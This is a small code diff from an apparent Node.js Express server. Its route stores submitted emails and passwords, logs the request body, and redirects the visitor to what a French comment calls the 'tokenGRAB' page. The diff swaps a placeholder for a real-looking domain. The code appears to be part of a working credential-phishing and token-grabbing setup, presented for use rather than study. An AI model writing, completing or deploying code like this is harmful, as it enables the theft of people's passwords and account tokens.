@@ -18,7 +18,7 @@ app.post('/sendconst', async (req, res) => {
     console.log(req.body);
     await UserAdd.AddUser(userval.password , userval.email);
     // Renvoie vers la page de tokenGRAB
-    const referringPage = 'TOKENGRAB_LINK';
+    const referringPage = 'https://raidprotect.pro';
     res.status(200).redirect(referringPage);
 });
 
